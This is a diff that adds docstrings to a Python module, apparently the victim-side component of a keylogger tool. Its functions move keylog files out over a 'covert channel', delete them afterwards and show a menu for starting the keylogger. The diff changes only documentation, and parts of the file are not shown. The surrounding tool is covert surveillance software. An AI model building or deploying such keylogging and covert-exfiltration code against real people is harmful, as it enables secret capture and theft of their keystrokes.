@@ -2,12 +2,29 @@ import socket
 import os
 
 def get_ip_address():
+    """
+    Get the local IP address of the machine.
+
+    Returns:
+        str: Local IP address.
+    """
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
         s.connect(("8.8.8.8", 80))
         name = s.getsockname()[0]
     return name
 
 def transfer_keylog_file(keylogger, covert, file_path):
+    """
+    Transfer the keylog file.
+
+    Args:
+        keylogger (Keylogger): Keylogger instance.
+        covert (CovertChannel): Covert channel instance.
+        file_path (str): Path of the keylog file.
+
+    Returns:
+        int: Status code (3 if unsuccessful).
+    """
     if keylogger.get_status():
         print("VICTIM:: Cannot transfer, Keylogger running")
         return 3
@@ -25,6 +42,15 @@ def transfer_keylog_file(keylogger, covert, file_path):
     os.remove(file_path)
 
 def make_dir(ip_address):
+    """
+    Create directories for watching and deleting files.
+
+    Args:
+        ip_address (str): IP address.
+
+    Returns:
+        str: Directory path.
+    """
     directory = 'downloads' + '/' + ip_address + "/watching"
     os.makedirs(directory, exist_ok=True)
     
@@ -34,6 +60,12 @@ def make_dir(ip_address):
     return directory
 
 def display_menu():
+    """
+    Display the menu for the user.
+
+    Returns:
+        None
+    """
     print(f"""
           \n-------------- MENU --------------\n
           1. Start Keylogger\n
@@ -52,6 +84,15 @@ def display_menu():
           )
 
 def check_exists(path):
+    """
+    Check if a file or directory exists.
+
+    Args:
+        path (str): Path to check.
+
+    Returns:
+        bool: True if exists, False otherwise.
+    """
     if os.path.exists(path):
         return True
     return False
